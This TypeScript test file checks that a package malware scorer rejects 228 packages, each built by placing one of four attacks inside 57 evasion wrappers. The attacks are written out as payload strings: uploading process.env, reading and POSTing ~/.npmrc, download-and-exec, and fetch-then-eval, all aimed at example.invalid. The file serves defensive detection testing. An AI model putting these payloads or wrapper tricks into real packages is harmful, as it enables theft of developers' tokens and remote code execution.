// The headline invariant of apm-score-v10's hardening: a real attack inside any wrapper the reviews found is refused.
// The 57 stored fixtures that score above the floor by design (they hold capabilities and no malware pattern) each wrap
// one inert payload in a trick: a comment or a regex the code reads back and runs, an evaluator behind a getter, a
// Proxy or a generator, a builtin another file redefines, a lexer quirk. Here each wrapper carries each of four real
// attacks instead: the whole environment uploaded, ~/.npmrc read and posted, a downloaded command run, and downloaded
// code evaluated. Every one of the 228 packages must score under the floor.
//
// Every payload is inert: the hosts are example.invalid, and each package is also run once in a node:vm context whose
// process, fetch, fs, os, child_process, worker_threads and vm only record what they are asked for and hand back fake
// values, so the test shows each wrapper really runs the attack it carries.
import { describe, expect, test } from "bun:test";
import vm from "node:vm";
import { z } from "zod";
import { analyze, finalize, SCORE_FLOOR, type TarEntry } from "../src/index.ts";
import lexerData from "./fixtures/sol-lexer.json";
import v5Data from "./fixtures/sol-parser-v5.json";
import v6Data from "./fixtures/sol-parser-v6.json";
import v7Data from "./fixtures/sol-v7.json";
import v8Data from "./fixtures/sol-v8.json";

/** The fixtures each review set scored above the floor by design under apm-score-v10 as first published (a6059cf). */
const BY_DESIGN = {
  "sol-lexer": ["floor-bypass-cr", "floor-bypass-of", "floor-bypass-html", "joined-floor"],
  "sol-parser-v5": [
    "scope-floor",
    "logical-floor",
    "getter-floor",
    "bound-floor",
    "apply-floor",
    "instance-getter",
    "instance-constructor",
    "instance-field",
    "static-getter",
    "define-property-getter",
    "function-returns-eval",
    "eval-passed-on",
    "param-default-eval",
    "proxy-trap-eval",
  ],
  "sol-parser-v6": [
    "tag-function",
    "extends-function",
    "extends-function-super",
    "prototype-constructor",
    "constructor-chain",
    "return-limit",
    "computed-bind",
    "symbol-key",
    "symbol-for",
    "generator-yield",
    "generator-return",
    "async-generator",
    "this-global",
    "getter-this",
    "alias-write",
    "descriptor",
    "proxy-target",
    "namespace-merge",
    "namespace-declare",
    "parameter-function",
    "candidate-limit",
  ],
  "sol-v7": [
    "indirect-coerce-unary",
    "indirect-coerce-compare",
    "indirect-coerce-lt",
    "indirect-coerce-template",
    "eval-alias-not-callable",
    "with-not-callable",
    "raw-js-mutation",
    "raw-ts-mutation",
    "raw-txt-mutation",
    "conversion-in",
    "conversion-instanceof",
    "padded-js-patch",
    "padded-ts-patch",
    "padded-txt-patch",
  ],
  "sol-v8": ["dynamic-entry-opaque-control", "dynamic-other-opaque-floor", "worker-floor-comment", "worker-regex-full"],
} as const;

const PADDING = { js: "0;".repeat(240_001), ts: `/*${"x".repeat(1024 * 1024)}*/\n` } as const;

/** One wrapper: its files as the review stored them, the file the manifest names as main, and the file the review ran. */
type Wrapper = { set: string; name: string; files: Record<string, string>; main: string; run: string };

const Single = z.object({ name: z.string(), file: z.string(), src: z.string() });

/** Another file of a fixture: its text, or (the v7 review's) text behind padding that keeps it from being parsed. */
const ExtraFile = z.union([z.string(), z.object({ pad: z.enum(["js", "ts"]).optional(), src: z.string() }).transform((e) => (e.pad ? PADDING[e.pad] : "") + e.src)]);

const WithExtra = Single.extend({ extra: z.record(z.string(), ExtraFile).optional(), pad: z.enum(["js", "ts"]).optional() });
const Packaged = z.object({ name: z.string(), main: z.string(), run: z.string(), files: z.record(z.string(), z.string()) });

function wrappers(): Wrapper[] {
  const out: Wrapper[] = [];
  const pick = <T extends { name: string }>(set: keyof typeof BY_DESIGN, list: readonly T[]): T[] => BY_DESIGN[set].map((name) => list.find((f) => f.name === name)).filter((f): f is T => f !== undefined);

  for (const [set, data] of [["sol-lexer", lexerData], ["sol-parser-v5", v5Data], ["sol-parser-v6", v6Data], ["sol-v7", v7Data]] as const) {
    for (const f of pick(set, z.array(WithExtra.loose()).parse(data))) {
      out.push({ set, name: f.name, files: { [f.file]: (f.pad ? PADDING[f.pad] : "") + f.src, ...f.extra }, main: f.file, run: f.file });
    }
  }

  for (const f of pick("sol-v8", z.array(Packaged.loose()).parse(v8Data))) out.push({ set: "sol-v8", name: f.name, files: f.files, main: f.main, run: f.run });

  return out;
}

// ---------- the payloads ----------

const PAYLOAD_NAMES = ["env upload", "npmrc read then POST", "download and exec", "fetch then eval"] as const;

type PayloadName = (typeof PAYLOAD_NAMES)[number];

/** Each attack as statements, using only what every wrapper's context has (no `require` inside an indirect eval). */
const PAYLOADS: Record<PayloadName, string> = {
  "env upload": "fetch('https://example.invalid/c',{method:'POST',body:JSON.stringify(process.env)})",
  "npmrc read then POST":
    "const t=process.getBuiltinModule('fs').readFileSync(process.getBuiltinModule('os').homedir()+'/.npmrc','utf8');fetch('https://example.invalid/c',{method:'POST',body:t})",
  "download and exec": "fetch('https://example.invalid/x').then(r=>r.text()).then(c=>process.getBuiltinModule('child_process').exec(c))",
  "fetch then eval": "fetch('https://example.invalid/x').then(r=>r.text()).then(c=>eval(c))",
};

/** The inert payload each wrapper carries, in the forms the fixtures write it, each with how to put an attack in its place. */
const CARRIED: readonly { text: string; with: (attack: string) => string }[] = [
  // inside a regex literal, whose `.source` the code runs: slashes escaped
  { text: "process.getBuiltinModule('chi'+'ld_process');fetch('https:\\/\\/example.invalid');process.env.NPM_TOKEN;eval('1')", with: (a) => a.replaceAll("/", "\\/") },
  { text: "process.getBuiltinModule('chi'+'ld_process');fetch('https://example.invalid');process.env.NPM_TOKEN;eval('1')", with: (a) => a },
  { text: "require('chi'+'ld_process');fetch('https://example.invalid');process.env.NPM_TOKEN;eval('1')", with: (a) => a },
  // an expression between two divisions: the attack as one call
  { text: "(require('chi'+'ld_process'),fetch('https://example.invalid'),process.env.NPM_TOKEN,eval('1'))", with: (a) => `((()=>{${a}})())` },
  { text: "require('chi'+'ld_process'); fetch('https://example.invalid'); process.env.NPM_TOKEN; eval('1');", with: (a) => `${a};` },
  // the wrapper is the name hidden by joining: the attack's fetch is reached the same way
  { text: "require('child_process');process.env.NPM_TOKEN;eval('1');globalThis['fe'+'tch']('https://example.invalid');", with: (a) => `${a.replaceAll("fetch(", "globalThis['fe'+'tch'](")};` },
];

/** The wrapper with `attack` in place of the payload it carried, or null when no file holds a known payload form. */
function armed(w: Wrapper, attack: string): Record<string, string> | null {
  for (const [path, text] of Object.entries(w.files)) {
    const form = CARRIED.find((c) => text.includes(c.text));

    if (form) return { ...w.files, [path]: text.replace(form.text, () => form.with(attack)) };
  }

  return null;
}

// ---------- scoring ----------

const STATE = { publishedAt: 0, now: 1e13, deprecated: null, status: "active", statusReason: null } as const;

function entry(path: string, text: string): TarEntry {
  const data = new TextEncoder().encode(text);

  return { path, size: data.length, mode: 0o644, data };
}

function scoreOf(files: Record<string, string>, main: string) {
  const manifest = { name: "probe-pkg", version: "1.0.0", license: "MIT", main };
  const r = finalize(analyze({ name: "probe-pkg", manifest, files: [entry("package.json", JSON.stringify(manifest)), ...Object.entries(files).map(([p, t]) => entry(p, t))], publisher: "a", previousPublishers: [] }), STATE);

  return { score: r.score, risks: r.signals.filter((s) => s.points < 0).map((s) => `${s.id} ${s.points}`) };
}

// ---------- running each one under recording stubs ----------

const FAKE_TOKEN = "npm_FAKE0000000000000000000000000000000";
const FAKE_NPMRC = `//registry.example.invalid/:_authToken=${FAKE_TOKEN}`;

/** What the stub fetch's response body holds: code that only records that it ran. */
const DOWNLOADED = "globalThis.__ran('downloaded')";

const typescript = new Bun.Transpiler({ loader: "ts" });

/** What a recording stub of a builtin module, or one of the package's own files once loaded, offers the code it runs. */
type Stub = {
  readFileSync?: (path: string) => string;
  homedir?: () => string;
  exec?: (command: string) => void;
  execSync?: (command: string) => string;
  Worker?: (code: string, options?: { eval?: boolean }) => void;
  runInThisContext?: (code: string) => void;
};

/** Runs a wrapper with an attack in it and resolves to what it asked the stubs for, in order. */
async function trace(w: Wrapper, files: Record<string, string>): Promise<string[]> {
  const calls: string[] = [];
  const record = <T>(call: string, value: T): T => (calls.push(call), value);
  const context = vm.createContext({});

  const source = (path: string): string => {
    const raw = files[path] ?? "";
    const text = /\.[cm]?ts$/.test(path) || (path.endsWith(".txt") && raw.startsWith("/*")) ? typescript.transformSync(raw) : raw;

    // a module's top-level await runs inside an async function here
    return path.endsWith(".mjs") ? `(async () => {${text}\n})()` : text;
  };

  const run = (code: string): void => {
    vm.runInContext(code, context, { timeout: 2000 });
  };

  const builtin = (m: string): Stub => {
    const name = m.replace(/^node:/, "");

    if (name === "fs") return { readFileSync: (p: string) => (p === w.run ? (files[w.run] ?? "") : record(`read:${p}`, p.endsWith(".npmrc") ? FAKE_NPMRC : "")) };

    if (name === "os") return { homedir: () => "/home/fake" };

    if (name === "child_process") return { exec: (c: string) => record(`exec:${c}`, undefined), execSync: (c: string) => record(`exec:${c}`, "") };

    if (name === "worker_threads") {
      return {
        Worker: function Worker(code: string, options?: { eval?: boolean }): void {
          if (options?.eval) run(code);
        },
      };
    }

    if (name === "vm") return { runInThisContext: run };

    return record(`module:${name}`, {});
  };

  // CommonJS loading of the package's own files, run in the same context; builtins are the stubs
  const require = (m: string): Stub => {
    const path = m.replace(/^\.\//, "");

    if (!(path in files)) return builtin(m);
    const module = { exports: {} satisfies Stub };
    vm.runInContext(`(function (module, exports, require) {${source(path)}\n})`, context)(module, module.exports, require);

    return module.exports;
  };

  Object.assign(context, {
    process: { env: { NPM_TOKEN: FAKE_TOKEN, HOME: "/home/fake" }, argv: ["node", w.run, "node:vm", "runInThisContext"], getBuiltinModule: builtin },
    fetch: (url: string, init?: { body?: string }) => record(`fetch:${url} ${init?.body ?? ""}`, Promise.resolve({ text: () => Promise.resolve(DOWNLOADED) })),
    __ran: (what: string) => record(`ran:${what}`, undefined),
    require,
    module: { exports: {} },
    __filename: w.run,
  });

  try {
    run(source(w.run));
  } catch {
    // a wrapper may throw after it ran what it carried (the review's `runs-then-throws`)
  }

  // let the payload's promise chains finish
  for (let i = 0; i < 5; i++) await new Promise((resolve) => setTimeout(resolve, 0));

  return calls;
}

/** What each attack does once it has run, as the stubs record it. */
const DID: Record<PayloadName, (calls: readonly string[]) => boolean> = {
  "env upload": (calls) => calls.some((c) => c.startsWith("fetch:") && c.includes(FAKE_TOKEN)),
  "npmrc read then POST": (calls) => calls.includes("read:/home/fake/.npmrc") && calls.some((c) => c.startsWith("fetch:") && c.includes(FAKE_NPMRC)),
  "download and exec": (calls) => calls.includes(`exec:${DOWNLOADED}`),
  "fetch then eval": (calls) => calls.includes("ran:downloaded"),
};

/**
 * Wrappers that redefine `fetch` as an evaluator for good (`globalThis.fetch = eval`): an attack that sends or downloads
 * with fetch throws there before it sends, so it is scored but not traced. The review recorded them as `runs-then-throws`.
 */
const FETCH_REPLACED: ReadonlySet<string> = new Set(["padded-js-patch", "padded-ts-patch", "padded-txt-patch"]);

const all = wrappers();

describe("real attacks inside the by-design wrappers", () => {
  test("all 57 wrappers are here, and each carries a payload form this test can replace", () => {
    expect(all.length).toBe(57);

    for (const w of all) expect(armed(w, PAYLOADS["env upload"]), `${w.set}/${w.name}`).not.toBeNull();
  });

  for (const w of all) {
    for (const name of PAYLOAD_NAMES) {
      test(`${w.set}/${w.name} with ${name} is refused`, async () => {
        const files = armed(w, PAYLOADS[name]);

        expect(files).not.toBeNull();

        if (!files) return;
        const { score, risks } = scoreOf(files, w.main);

        expect(score, `${score}: ${risks.join(", ")}`).toBeLessThan(SCORE_FLOOR);

        if (FETCH_REPLACED.has(w.name)) return;
        const calls = await trace(w, files);

        expect(DID[name](calls), `the wrapper runs the attack: ${calls.join(" | ")}`).toBe(true);
      });
    }
  }
});
